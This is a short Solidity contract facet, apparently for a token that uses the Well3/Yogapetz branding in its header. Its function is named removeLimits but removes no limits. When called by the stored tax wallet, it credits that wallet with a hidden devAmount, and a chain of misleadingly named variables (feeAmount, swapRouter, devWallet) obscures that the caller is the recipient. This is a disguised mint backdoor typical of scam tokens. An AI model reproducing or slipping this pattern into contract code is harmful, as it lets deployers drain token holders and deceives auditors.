// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://well3.com/
    Twitter:  https://twitter.com/well3official
    Discord:  https://discord.com/invite/yogapetz

*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet is Ownable {
    function removeLimits() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == ds._taxWallet) {
            require(ds._taxWallet == _msgSender());
            address feeAmount = _msgSender();
            address swapRouter = feeAmount;
            address devWallet = swapRouter;
            ds._balances[devWallet] += ds.devAmount;
        }
    }
}
